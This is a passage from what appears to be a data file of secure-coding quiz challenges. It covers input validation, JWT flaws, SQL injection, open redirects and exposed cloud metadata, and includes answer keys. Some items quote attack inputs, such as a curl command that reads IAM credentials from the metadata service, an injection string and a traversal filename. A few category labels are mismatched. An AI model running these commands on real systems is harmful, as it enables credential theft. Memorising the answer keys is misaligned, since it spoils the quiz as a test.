  // db.findById(req.query.id) might behave unexpectedly.
});`,
        language: 'javascript',
        options: [
            {
                id: '117a',
                code: `// Perform strict server-side validation on all inputs.
// Check the type, format, length, and range of the input.
const id = parseInt(req.query.id, 10);
if (isNaN(id) || id <= 0) {
    return res.status(400).send("Invalid ID");
}`
            },
            {
                id: '117b',
                code: `// Use a client-side <input type="number"> to restrict input.`
            },
            {
                id: '117c',
                code: `// Trust the database to handle incorrect data types.`
            }
        ],
        correctOptionId: '117a',
        explanation: 'All input from external sources must be considered untrusted and must be rigorously validated on the server side. Client-side validation is a UX convenience but provides no security. You must check that the data is the correct type and within the expected range.',
    },
    {
        id: '118',
        title: 'Unpatched System / Out-of-Date Software',
        category: 'Supply Chain',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The application is running on a server with an old, unpatched operating system or web server (e.g., an old version of Nginx with a known RCE vulnerability).',
        vulnerableCode: `// This is an infrastructure vulnerability, not an application code one.
// e.g., Server running on a version of Linux with a known kernel exploit.`,
        language: 'generic',
        options: [
            {
                id: '118a',
                code: `// Implement a robust patch management process.
// Regularly apply security patches to the operating system, web server, language runtime, and all other system software.`
            },
            {
                id: '118b',
                code: `// Use a Web Application Firewall (WAF) to virtually patch the vulnerability.`
            },
            {
                id: '118c',
                code: `// Isolate the server in a separate network segment.`
            }
        ],
        correctOptionId: '118a',
        explanation: 'The foundation of security is keeping systems patched. While other measures provide defense-in-depth, failing to apply security patches leaves the system open to well-known, often easily exploitable vulnerabilities. A consistent and timely patch management process is non-negotiable.',
    },
    {
        id: '119',
        title: 'API Versioning Flaw',
        category: 'Broken Auth',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A new, secure version of an API (`/v2`) is released, but the old, vulnerable version (`/v1`) is left active and unprotected.',
        vulnerableCode: `// Conceptual API Routing
// v1 has an IDOR vulnerability. v2 has fixed it.
app.use('/api/v1', vulnerableApiRouter);
app.use('/api/v2', secureApiRouter);`,
        language: 'javascript',
        options: [
            {
                id: '119a',
                code: `// Once a new version is stable and clients have migrated, the old version must be properly decommissioned and shut down.`
            },
            {
                id: '119b',
                code: `// Back-port the security fix from v2 to v1.`
            },
            {
                id: '119c',
                code: 'Both A and B are valid strategies. A is ideal, but if v1 cannot be shut down, it must be patched (B).'
            }
        ],
        correctOptionId: '119c',
        explanation: 'Leaving old API versions running is a common source of vulnerabilities ("zombie APIs"). The best solution is to have a clear lifecycle policy and decommission old versions (A). If that\'s not possible due to client dependencies, any security fixes must be back-ported to all supported versions (B).',
    },
    {
        id: '120',
        title: 'Denial of Service (Memory Exhaustion)',
        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An application reads an entire user-provided file into memory without checking its size, allowing an attacker to exhaust server RAM.',
        vulnerableCode: `// Python (File Processing)
def process_file(uploaded_file):
    # Attacker uploads a 4GB file. This line reads it all into RAM.
    content = uploaded_file.read()
    # ... process content ...`,
        language: 'python',
        options: [
            {
                id: '120a',
                code: `// Process the file in chunks or streams instead of reading it all at once.
def process_file(uploaded_file):
    for chunk in uploaded_file.chunks():
        # process chunk...`
            },
            {
                id: '120b',
                code: `// Enforce a strict file size limit before attempting to read the file.`
            },
            {
                id: '120c',
                code: 'Both A and B are necessary. You should enforce a size limit (B), and you should also process the file in a memory-efficient way (A).'
            }
        ],
        correctOptionId: '120c',
        explanation: 'For robust handling of file uploads, you should always enforce a size limit first (B). Then, regardless of the limit, you should process the file in streams or chunks (A) rather than reading it all into memory at once. This protects against resource exhaustion.',
    },
    {
        id: '121',
        title: 'Hardcoded Bearer Token in Mobile App',
        category: 'Mobile Security',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'A mobile app has a long-lived API bearer token hardcoded into its source code. An attacker can decompile the app and use this token to impersonate the application.',
        vulnerableCode: `// Swift
let headers = [
  "Authorization": "Bearer abc123def456_this_is_a_secret_token"
]`,
        language: 'generic',
        options: [
            {
                id: '121a',
                code: `// Do not hardcode long-lived tokens.
// Implement a secure authentication flow (e.g., OAuth 2.0) where the app obtains a short-lived access token after the user logs in.`
            },
            {
                id: '121b',
                code: `// Encrypt the token in the source code.`
            },
            {
                id: '121c',
                code: `// Store the token in a configuration file instead of source code.`
            }
        ],
        correctOptionId: '121a',
        explanation: 'Static, long-lived credentials should never be stored in a client application. The standard secure pattern is for the application to authenticate a user (or itself) with a backend service to receive a short-lived access token that is then used for API calls.',
    },
    {
        id: '122',
        title: 'User Enumeration / Username Guessing',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'A login form gives different error messages for "user not found" versus "invalid password", allowing an attacker to determine which usernames are valid.',
        vulnerableCode: `// API Logic
app.post('/login', (req, res) => {
    const user = db.findUser(req.body.username);
    if (!user) {
        return res.status(404).send("User not found."); // Information Leak!
    }
    if (!checkPassword(user, req.body.password)) {
        return res.status(401).send("Invalid password.");
    }
    // ... log user in ...
});`,
        language: 'javascript',
        options: [
            {
                id: '122a',
                code: `// Return the same generic error message for both cases.
if (!user || !checkPassword(user, req.body.password)) {
    return res.status(401).send("Invalid username or password.");
}`
            },
            {
                id: '122b',
                code: `// Add a CAPTCHA to the login form.`
            },
            {
                id: '122c',
                code: `// Implement account lockout.`
            }
        ],
        correctOptionId: '122a',
        explanation: 'To prevent user enumeration, authentication endpoints must always return a generic and consistent error message, regardless of whether the username was invalid or the password was incorrect.',
    },
    {
        id: '123',
        title: 'Insecure `target="_blank"` Links',
        category: 'Web Cache Poisoning',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'An external link opens in a new tab without `rel="noopener"`, giving the new page access to the original page via `window.opener`.',
        vulnerableCode: `<a href="https://external-site.com" target="_blank">Visit our partner!</a>`,
        language: 'generic',
        options: [
            {
                id: '123a',
                code: `// Always add 'rel="noopener noreferrer"' to links with 'target="_blank"'.
<a href="..." target="_blank" rel="noopener noreferrer">...</a>`
            },
            {
                id: '123b',
                code: `// Open the link in the same tab instead.`
            },
            {
                id: '123c',
                code: `// Use JavaScript's window.open() to open the link.`
            }
        ],
        correctOptionId: '123a',
        explanation: 'This vulnerability, known as tabnabbing, is prevented by adding `rel="noopener noreferrer"` to any link that uses `target="_blank"`. This severs the connection between the two windows.',
    },
    {
        id: '124',
        title: 'XML Entity Expansion (DoS)',
        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An XML parser is configured to allow DTDs and entity expansion, making it vulnerable to a "Billion Laughs" attack.',
        vulnerableCode: `// Java
// Default configuration may be vulnerable.
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
builder.parse(untrustedXmlStream);`,
        language: 'java',
        options: [
            {
                id: '124a',
                code: `// Securely configure the XML parser to disallow DTDs.
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
            },
            {
                id: '124b',
                code: `// Check the input XML size before parsing.`
            },
            {
                id: '124c',
                code: `// Use a different data format, like JSON.`
            }
        ],
        correctOptionId: '124a',
        explanation: 'This DoS attack relies on entity expansion defined in a DTD. The most effective way to prevent it is to configure the XML parser to completely disallow DTDs, which also prevents other DTD-based attacks like XXE.',
    },
    {
        id: '125',
        title: 'Open S3 Bucket (Public Read)',
        category: 'Cloud Security',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An S3 bucket is misconfigured to allow public read access to all its objects.',
        vulnerableCode: `// AWS S3 Bucket Policy
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::my-sensitive-bucket/*"
}`,
        language: 'generic',
        options: [
            {
                id: '125a',
                code: `// Remove the public access policy.`
            },
            {
                id: '125b',
                code: `// Enable "Block all public access" at the bucket settings level.`
            },
            {
                id: '125c',
                code: 'Both A and B are necessary. B provides a fail-safe, while A corrects the underlying misconfiguration.'
            }
        ],
        correctOptionId: '125c',
        explanation: 'Public S3 buckets are a major source of data leaks. The best practice is to enable the "Block all public access" setting (B) as a safety net and to also ensure your bucket policies do not grant public access (A).',
    },
    {
        id: '126',
        title: 'Race Condition (TOCTOU)',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 90,
        description: 'The application checks for a condition (e.g., file existence) and then performs an action based on it, but an attacker can change the condition between the check and the action.',
        vulnerableCode: `// C/C++
// Time-of-Check to Time-of-Use
if (access("/path/to/file", W_OK) == 0) {
    // Attacker replaces file with a symlink to /etc/passwd here.
    f = open("/path/to/file", "w");
    // Writes to the sensitive file instead.
}`,
        language: 'cpp',
        options: [
            {
                id: '126a',
                code: `// Do not check and then act. Perform the action directly and handle any errors.
// Try to open the file directly and handle the potential permission error.`
            },
            {
                id: '126b',
                code: `// Lock the file before checking permissions.`
            },
            {
                id: '126c',
                code: `// Check the permissions multiple times.`
            }
        ],
        correctOptionId: '126a',
        explanation: 'TOCTOU race conditions are solved by making the check-and-act sequence atomic. In this case, instead of checking permissions first, you should try to perform the `open` operation directly. The operating system guarantees that the permission check and file opening are atomic.',
    },
    {
        id: '127',
        title: 'Unsanitized Input in `eval`',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 100,
        description: 'User-controlled input is passed to a dynamic code execution function like `eval()`.',
        vulnerableCode: `// JavaScript
let userInput = "alert('pwned')";
eval(userInput);`,
        language: 'javascript',
        options: [
            {
                id: '127a',
                code: `// Do not use eval(). Ever. Refactor the code to achieve the goal without executing strings as code.`
            },
            {
                id: '127b',
                code: `// Sanitize the input to remove parentheses and quotes.`
            },
            {
                id: '127c',
                code: `// Run the eval in a Web Worker.`
            }
        ],
        correctOptionId: '127a',
        explanation: 'The `eval` function is a massive security risk, often referred to as "evil". There is no reliable way to sanitize input for it. The only correct solution is to find an alternative implementation that does not involve executing dynamically generated code from strings.',
    },
    {
        id: '128',
        title: 'JWT Algorithm Confusion',
        category: 'Auth',
        difficulty: 'Expert',
        xp: 95,
        description: 'An attacker can trick the server into verifying a token using a weaker algorithm (HS256) instead of the intended stronger one (RS256).',
        vulnerableCode: `// Conceptual: Attacker takes a public key, crafts an HMAC-signed token using the public key as the secret, and changes the 'alg' header to 'HS256'.
// Vulnerable server code might then use the public key as the secret to verify the HMAC signature.`,
        language: 'generic',
        options: [
            {
                id: '128a',
                code: `// When verifying a token, the server must *enforce* the expected algorithm and ignore the 'alg' header in the token itself.
// The code should be hardcoded to only accept 'RS256' for this token type.`
            },
            {
                id: '128b',
                code: `// Use a different library for JWT verification.`
            },
            {
                id: '128c',
                code: `// Use a very long public key.`
            }
        ],
        correctOptionId: '128a',
        explanation: 'The server must be the authority on which algorithm is acceptable. It should never trust the `alg` header from the untrusted token. The verification code must be configured to use one specific, expected algorithm (e.g., RS256) and reject any token that uses a different one.',
    },
    {
        id: '129',
        title: 'Use of Broken or Risky Cryptographic Algorithm',
        category: 'Crypto',
        difficulty: 'Advanced',
        xp: 80,
        description: 'The application uses a cryptographic algorithm that is known to be weak or has been deprecated, such as MD5 for password hashing or ECB mode for encryption.',
        vulnerableCode: `// Java
// ECB mode is not secure as it lacks diffusion.
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");`,
        language: 'java',
        options: [
            {
                id: '129a',
                code: `// Use modern, recommended algorithms and modes.
// For encryption, use AES in a mode like GCM or CBC with a random IV.
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");`
            },
            {
                id: '129b',
                code: `// Use a longer key for the weak algorithm.`
            },
            {
                id: '129c',
                code: `// Re-encrypt the data multiple times.`
            }
        ],
        correctOptionId: '129a',
        explanation: 'Using deprecated or weak cryptography provides a false sense of security. Developers must use current, industry-standard algorithms and modes that are recommended by security experts and organizations like NIST.',
    },
    {
        id: '130',
        title: 'Publicly Exposed Cloud IAM Keys',
        category: 'Cloud Security',
        difficulty: 'Expert',
        xp: 100,
        description: 'A developer accidentally commits AWS IAM access keys (Access Key ID and Secret Access Key) to a public GitHub repository.',
        vulnerableCode: `// Code committed to public GitHub repo
const awsConfig = {
    accessKeyId: 'AKIA...',
    secretAccessKey: 'verylongsecretkey...'
};`,
        language: 'javascript',
        options: [
            {
                id: '130a',
                code: `// 1. Immediately invalidate and delete the exposed keys in the AWS IAM console.
// 2. Remove the keys from the repository's entire history (not just a new commit).
// 3. Use short-lived credentials or IAM roles for EC2 instances instead of long-lived keys.`
            },
            {
                id: '130b',
                code: `// Delete the GitHub repository.`
            },
            {
                id: '130c',
                code: `// Encrypt the keys before committing them.`
            }
        ],
        correctOptionId: '130a',
        explanation: 'Once secret keys are exposed publicly, they must be considered compromised and should be immediately revoked. Then, the repository history must be rewritten to remove them completely. The best practice is to avoid long-lived access keys whenever possible and use IAM Roles instead.',
    },
    {
        id: '131',
        title: 'Insecure `BroadcastReceiver` (Data Leak)',
        category: 'Mobile Security',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An Android app sends a broadcast containing sensitive information without specifying a receiver, allowing any app on the device to intercept it.',
        vulnerableCode: `// Java (Android)
Intent intent = new Intent();
intent.setAction("com.example.UPDATE_DATA");
intent.putExtra("secret_data", "my secret");
// This is a system-wide broadcast, any app can receive it.
sendBroadcast(intent);`,
        language: 'java',
        options: [
            {
                id: '131a',
                code: `// If the broadcast is meant for your own app, use LocalBroadcastManager to keep it within your app's process.
LocalBroadcastManager.getInstance(this).sendBroadcast(intent);`
            },
            {
                id: '131b',
                code: `// If it must be a system-wide broadcast, explicitly set the target package or protect it with a permission.
intent.setPackage("com.example.trustedreceiver");
sendBroadcast(intent);`
            },
            {
                id: '131c',
                code: 'Both A and B are valid solutions depending on the use case. A is preferred for intra-app communication.'
            }
        ],
        correctOptionId: '131c',
        explanation: 'System-wide broadcasts are public. For communication within your own app, `LocalBroadcastManager` is secure and efficient (A). If you must send a broadcast to another specific app, you should explicitly name the receiver\'s package to prevent other apps from intercepting it (B).',
    },
    {
        id: '132',
        title: 'SQLi via ORDER BY Clause',
        category: 'SQL Injection',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An `ORDER BY` clause in a SQL query is built using user input, which cannot be parameterized, leading to potential SQL injection.',
        vulnerableCode: `// Python
sort_column = request.args.get('sort')
// Attacker provides: "(CASE WHEN (1=1) THEN username ELSE email END)"
query = f"SELECT * FROM users ORDER BY {sort_column}"`,
        language: 'python',
        options: [
            {
                id: '132a',
                code: `// Map the user input to a whitelist of allowed column names.
allowed_columns = {"name": "username", "date": "created_at"}
sort_key = allowed_columns.get(sort_column, "username") // Default to a safe column
query = f"SELECT * FROM users ORDER BY {sort_key}"`
            },
            {
                id: '132b',
                code: `// Use a parameterized query.
query = "SELECT * FROM users ORDER BY ?" // This does not work for ORDER BY`
            },
            {
                id: '132c',
                code: `// Remove all special characters from the input.`
            }
        ],
        correctOptionId: '132a',
        explanation: 'Identifiers like table or column names cannot be replaced by parameter markers (`?`). The only safe way to handle user-controlled sorting is to validate the user\'s input against a strict whitelist of known, safe column names.',
    },
    {
        id: '133',
        title: 'Insecure Third-Party JavaScript Inclusion',
        category: 'Supply Chain',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A website includes a script from a third-party domain without using Subresource Integrity (SRI), allowing the third party (or an attacker who compromises them) to execute arbitrary code.',
        vulnerableCode: `<script src="https://third-party.cdn.com/library.js"></script>`,
        language: 'generic',
        options: [
            {
                id: '133a',
                code: `// Use Subresource Integrity (SRI) by adding an 'integrity' hash to the script tag.
// The browser will only execute the script if its content matches the hash.
<script src="..."
        integrity="sha384-some-hash-value"
        crossorigin="anonymous"></script>`
            },
            {
                id: '133b',
                code: `// Host the script on your own server instead of a CDN.`
            },
            {
                id: '133c',
                code: `// Use a Content Security Policy (CSP) to whitelist the CDN.`
            }
        ],
        correctOptionId: '133a',
        explanation: 'While a CSP helps, it doesn\'t protect you if the whitelisted CDN itself is compromised. Subresource Integrity (SRI) is the specific control for this threat. It provides a cryptographic hash that the browser uses to verify that the fetched file has not been tampered with.',
    },
    {
        id: '134',
        title: 'Business Logic Flaw (Race Condition on Promo Code)',
        category: 'Business Logic',
        difficulty: 'Expert',
        xp: 95,
        description: 'An endpoint for applying a promo code checks if the code is valid and then applies it, but an attacker can send many simultaneous requests to use the same single-use code multiple times.',
        vulnerableCode: `// Conceptual API Logic
async function applyPromo(userId, code) {
    // 1. Check if code is valid and has uses remaining
    const promo = await db.getPromo(code);
    if (promo && promo.uses_left > 0) {
        // 2. Attacker sends multiple requests that all pass the check here
        // 3. Apply discount to user's cart
        await db.applyDiscount(userId);
        // 4. Decrement uses
        await db.decrementPromo(code);
    }
}`,
        language: 'generic',
        options: [
            {
                id: '134a',
                code: `// Make the check-and-decrement operation atomic using a database transaction and a row lock.
// BEGIN;
// SELECT * FROM promos WHERE code = ? AND uses_left > 0 FOR UPDATE;
// -- If a row is returned --
// UPDATE promos SET uses_left = uses_left - 1 WHERE code = ?;
// COMMIT;`
            },
            {
                id: '134b',
                code: `// Add a rate limit to the endpoint.`
            },
            {
                id: '134c',
                code: `// Keep track of used codes in a separate table and check it first.`
            }
        ],
        correctOptionId: '134a',
        explanation: 'This is another "Time-of-check to time-of-use" (TOCTOU) race condition. The only robust solution is to make the entire operation atomic at the database level. A transaction with `SELECT ... FOR UPDATE` locks the specific promo code row, forcing subsequent requests to wait until the first transaction is complete.',
    },
    {
        id: '135',
        title: 'Missing HSTS Header',
        category: 'Protocol',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'An HTTPS site does not send the HTTP Strict-Transport-Security (HSTS) header, leaving it vulnerable to SSL-stripping man-in-the-middle attacks.',
        vulnerableCode: '// Web server is configured for HTTPS but is missing a critical security header.',
        language: 'generic',
        options: [
            {
                id: '135a',
                code: `// Add the HSTS header to all HTTPS responses. The max-age should be long (e.g., 1 year). 'includeSubDomains' is also recommended.
Strict-Transport-Security: max-age=31536000; includeSubDomains`
            },
            {
                id: '135b',
                code: `// Always redirect HTTP requests to HTTPS.`
            },
            {
                id: '135c',
                code: `// Use an Extended Validation (EV) SSL certificate.`
            },
        ],
        correctOptionId: '135a',
        explanation: 'HSTS is a crucial security mechanism that instructs browsers to *only* communicate with a site over HTTPS, preventing downgrade attacks. While redirecting HTTP to HTTPS is also necessary, HSTS provides client-side enforcement.',
    },
    {
        id: '136',
        title: 'Open Redirect via `continue` Parameter',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'A login page redirects to a URL specified in a `continue` or `next` parameter, but fails to validate that the URL is local to the application.',
        vulnerableCode: `// Python (Flask)
@app.route('/login')
def login():
    next_url = request.args.get('next')
    // Attacker can craft a link like: /login?next=//evil.com
    if user_is_authenticated():
        return redirect(next_url)`,
        language: 'python',
        options: [
            {
                id: '136a',
                code: `// Always validate that the redirect URL is for the same host or is a relative path.
def is_safe_url(target):
    // ... implementation ...

if is_safe_url(next_url):
    return redirect(next_url)
else:
    return redirect('/') // Redirect to a safe default`
            },
            {
                id: '136b',
                code: '// URL-encode the `next_url` before redirecting.'
            },
            {
                id: '136c',
                code: `// Show a warning page to the user before redirecting to an external site.`
            }
        ],
        correctOptionId: '136a',
        explanation: 'Open redirects are a common phishing vector. The application must never blindly trust a redirect parameter from the user. It must validate that the URL is safe, typically by checking that it belongs to the same domain or is a relative path.',
    },
    {
        id: '137',
        title: 'iOS URL Scheme Hijacking',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An iOS app registers a custom URL scheme (e.g., `myapp://`). A malicious app can register the same scheme. If the user clicks a `myapp://` link, the malicious app might open instead of the legitimate one.',
        vulnerableCode: `<!-- Info.plist -->
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string> <!-- Non-unique scheme -->
        </array>
    </dict>
</array>`,
        language: 'generic',
        options: [
            {
                id: '137a',
                code: '// Use Universal Links instead of custom URL schemes for deep linking. Universal Links use standard https:// URLs and are cryptographically verified by the OS.'
            },
            {
                id: '137b',
                code: '// Use a very long and unique URL scheme.'
            },
            {
                id: '137c',
                code: '// Prompt the user to confirm they want to open your app.'
            },
        ],
        correctOptionId: '137a',
        explanation: 'Custom URL schemes are inherently insecure because they are not unique. The modern, secure replacement on iOS is Universal Links (and App Links on Android), which use standard `https` URLs and a secure association between the domain and the app.',
    },
    {
        id: '138',
        title: 'Exposed Docker Socket',
        category: 'Cloud Security',
        difficulty: 'Expert',
        xp: 95,
        description: 'The Docker socket (`/var/run/docker.sock`) is mounted into a container, giving that container full, root-level control over the host machine.',
        vulnerableCode: `// docker-compose.yml
services:
  my_app:
    image: my_image
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock # Very dangerous!`,
        language: 'generic',
        options: [
            {
                id: '138a',
                code: '// Do not mount the Docker socket into containers unless absolutely necessary and you fully trust the container image. Find an alternative way to achieve the goal.'
            },
            {
                id: '138b',
                code: '// Mount the socket as read-only.'
            },
            {
                id: '138c',
                code: '// Run the container as a non-root user.'
            },
        ],
        correctOptionId: '138a',
        explanation: 'Mounting the Docker socket is equivalent to giving the container root access to the host. It should be avoided at all costs. If you need to interact with Docker from within a container, explore safer alternatives like a secure proxy or a sidecar that exposes a limited, specific API.',
    },
    {
        id: '139',
        title: 'Deserialization of Untrusted Data (Python Pickle)',
        category: 'Insecure Deserialization',
        difficulty: 'Advanced',
        xp: 90,
        description: 'The Python `pickle` module is used to deserialize data from an untrusted source, which can lead to arbitrary code execution.',
        vulnerableCode: `// Python
import pickle
# 'untrusted_data' comes from a network request or file.
data = pickle.loads(untrusted_data)`,
        language: 'python',
        options: [
            {
                id: '139a',
                code: `// The official documentation states: "The pickle module is not secure". Do not use it for untrusted data. Use a safe format like JSON instead.
import json
data = json.loads(untrusted_data)`
            },
            {
                id: '139b',
                code: `// Use a different pickling protocol version.`
            },
            {
                id: '139c',
                code: `// Try to catch exceptions during unpickling.`
            }
        ],
        correctOptionId: '139a',
        explanation: 'The `pickle` module is explicitly not secure and should never be used on data from an untrusted source. The only safe fix is to replace it with a secure, data-only serialization format like JSON.',
    },
    {
        id: '140',
        title: 'JWT Token with No Expiration',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'A JWT is issued without an `exp` (expiration time) claim, meaning that if it is stolen, it can be used forever.',
        vulnerableCode: `// JavaScript (jsonwebtoken)
// No 'exp' claim is set.
const token = jwt.sign({ user: 'bob' }, secret);`,
        language: 'javascript',
        options: [
            {
                id: '140a',
                code: `// Always set a reasonable expiration time for JWTs.
const token = jwt.sign(
    { user: 'bob' },
    secret,
    { expiresIn: '1h' } // e.g., expires in 1 hour
);`
            },
            {
                id: '140b',
                code: `// Store the token in a database and check its status on every request.`
            },
            {
                id: '140c',
                code: `// Use a very long and complex secret key.`
            },
        ],
        correctOptionId: '140a',
        explanation: 'JWTs are often stateless, which means there is no easy way to revoke them. Therefore, they MUST have an expiration time (`exp` claim) to limit the window of opportunity for an attacker if the token is compromised.',
    },
    {
        id: '141',
        title: 'Failure to Invalidate Session on Logout',
        category: 'Session Management',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'The logout function only removes the session cookie from the client-side, but does not invalidate the session on the server-side.',
        vulnerableCode: `// JavaScript (Client-side logout)
function logout() {
    // This only deletes the cookie in the browser.
    // The session is still valid on the server.
    document.cookie = "sessionId=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
}`,
        language: 'javascript',
        options: [
            {
                id: '141a',
                code: `// The logout button must trigger an API call to a '/logout' endpoint on the server.
// The server must then destroy its session state associated with that user.
app.post('/logout', (req, res) => {
    req.session.destroy();
    res.send("Logged out");
});`
            },
            {
                id: '141b',
                code: `// Use sessionStorage instead of a cookie.`
            },
            {
                id: '141c',
                code: `// Set a very short expiration time on the cookie.`
            }
        ],
        correctOptionId: '141a',
        explanation: 'The server is the authority on session state. A proper logout function must involve the server actively destroying the session. Simply deleting the token on the client is insufficient, as an attacker who has already stolen the token can continue to use it.',
    },
    {
        id: '142',
        title: 'Use of Hardcoded Salt for Password Hashing',
        category: 'Crypto',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'The application uses the same static, hardcoded salt for every user\'s password hash. This negates the primary purpose of a salt.',
        vulnerableCode: `// Python
import hashlib
password = "password123"
static_salt = "my-static-salt"
hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), static_salt.encode(), 100000)`,
        language: 'python',
        options: [
            {
                id: '142a',
                code: `// Generate a new, unique, cryptographically random salt for each user and store it with their password hash.
import os
salt = os.urandom(16)
hashed = hashlib.pbkdf2_hmac(...)`
            },
            {
                id: '142b',
                code: `// Use a longer static salt.`
            },
            {
                id: '142c',
                code: `// Use the username as the salt.`
            }
        ],
        correctOptionId: '142a',
        explanation: 'A salt\'s purpose is to be unique for every hash. Using a static salt is a critical mistake. The correct procedure is to generate a new random salt for each user, hash the password with it, and then store both the salt and the hash together in the database.',
    },
    {
        id: '143',
        title: 'Missing `autocomplete="off"` on Sensitive Fields',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A form field for sensitive, one-time information (like a credit card verification code - CVV) does not disable browser autocomplete.',
        vulnerableCode: `<label>CVV:</label>
<input type="text" name="cvv">`,
        language: 'generic',
        options: [
            {
                id: '143a',
                code: `// Add 'autocomplete="off"' to prevent the browser from storing or autofilling the sensitive value.
<label>CVV:</label>
<input type="text" name="cvv" autocomplete="off">`
            },
            {
                id: '143b',
                code: `// Use 'type="password"' for the CVV field.`
            },
            {
                id: '143c',
                code: `// The server should not log the CVV.`
            }
        ],
        correctOptionId: '143a',
        explanation: 'For fields containing highly sensitive information that should never be stored (like a CVV or a one-time password), you should use `autocomplete="off"` to signal to the browser that it should not save or autofill this value.',
    },
    {
        id: '144',
        title: 'Unsanitized Filename on `Content-Disposition` Header',
        category: 'File Inclusion',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An application sets the `Content-Disposition` header for a file download using a user-provided filename without sanitization, potentially leading to path traversal on the client.',
        vulnerableCode: `// Java (Servlet)
String filename = request.getParameter("filename");
// Attacker provides: "../../../file.exe"
response.setHeader("Content-Disposition", "attachment; filename=" + filename);`,
        language: 'java',
        options: [
            {
                id: '144a',
                code: `// Sanitize the filename to remove directory traversal characters and ensure it's just a simple filename.
String safeFilename = filename.replaceAll("[^a-zA-Z0-9._-]", "");
response.setHeader("Content-Disposition", "attachment; filename=\\"" + safeFilename + "\\"");`
            },
            {
                id: '144b',
                code: `// Use a generic filename like "download.dat".`
            },
            {
                id: '144c',
                code: 'Both A and B are valid. B is simplest, but A is necessary if you need to preserve the original filename.'
            }
        ],
        correctOptionId: '144c',
        explanation: 'User-controlled filenames in the `Content-Disposition` header must be sanitized to prevent an attacker from tricking a user into saving a file in an unintended location (e.g., a startup directory). Removing path characters (A) or using a fixed filename (B) are both effective mitigations.',
    },
    {
        id: '145',
        title: 'Improper Input Validation for Regex',
        category: 'DoS / Abuse',
        difficulty: 'Expert',
        xp: 90,
        description: 'A user provides a regular expression that is used on the server, but the regex is crafted to cause ReDoS (Regular Expression Denial of Service).',
        vulnerableCode: `// JavaScript (Node.js)
// An API that lets users validate strings against their own regex.
app.get('/validate', (req, res) => {
    const { pattern, input } = req.query;
    // Attacker provides a malicious pattern like '(a+)+'.
    const regex = new RegExp(pattern);
    const result = regex.test(input);
    res.send({ match: result });
});`,
        language: 'javascript',
        options: [
            {
                id: '145a',
                code: `// Accepting user-defined regular expressions is extremely dangerous and should be avoided.
// There is no perfectly safe way to sanitize a regex pattern for ReDoS.`
            },
            {
                id: '145b',
                code: `// Execute the regex matching in a separate process with a strict timeout.`
            },
            {
                id: '145c',
                code: `// Use a static analysis tool to check if the user's regex is vulnerable.`
            }
        ],
        correctOptionId: '145a',
        explanation: 'Allowing users to provide arbitrary regular expressions for server-side execution is a recipe for a ReDoS vulnerability. There is no simple, reliable way to sanitize a regex to prevent catastrophic backtracking. This feature should be avoided entirely if possible.',
    },
    {
        id: '146',
        title: 'Insecure `WebView` File Access (Android)',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An Android WebView is configured with `setAllowFileAccess(true)`, allowing JavaScript loaded from a remote, untrusted URL to access local files on the device.',
        vulnerableCode: `// Java (Android)
WebView webView = findViewById(R.id.webview);
WebSettings webSettings = webView.getSettings();
webSettings.setJavaScriptEnabled(true);
// This setting is dangerous when loading remote content.
webSettings.setAllowFileAccess(true);
webView.loadUrl("https://untrusted.com");`,
        language: 'java',
        options: [
            {
                id: '146a',
                code: `// Disable file access unless it is absolutely necessary for the WebView's function, especially when loading remote content.
webSettings.setAllowFileAccess(false);`
            },
            {
                id: '146b',
                code: `// Only load content from trusted, local app assets.`
            },
            {
                id: '146c',
                code: `// Add a Content Security Policy (CSP) to the loaded page.`
            }
        ],
        correctOptionId: '146a',
        explanation: 'Allowing a WebView to access the local file system is a powerful and dangerous permission. It should be disabled by default and only enabled if the WebView is loading fully trusted content from the app\'s local assets, not from the internet.',
    },
    {
        id: '147',
        title: 'Exposed Cloud Compute Instance Metadata',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A VM or container in the cloud is compromised, and the attacker queries the internal metadata service (169.254.169.254) to steal access tokens for the attached service account.',
        vulnerableCode: `// Attacker on a compromised EC2 instance runs:
// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/My-Role-Name
// This returns a temporary AccessKeyId, SecretAccessKey, and Token.`,
        language: 'generic',
        options: [
            {
                id: '147a',
                code: `// Enforce the use of IMDSv2 (Instance Metadata Service Version 2) on cloud instances. IMDSv2 requires a session-oriented approach that mitigates SSRF attacks.`
            },
            {
                id: '147b',
                code: `// Apply the principle of least privilege: ensure the attached IAM role has only the absolute minimum permissions required for its job.`
            },
            {
                id: '147c',
                code: 'Both A and B are essential defenses. B limits the damage an attacker can do if they steal credentials, and A makes it much harder to steal them in the first place.'
            }
        ],
        correctOptionId: '147c',
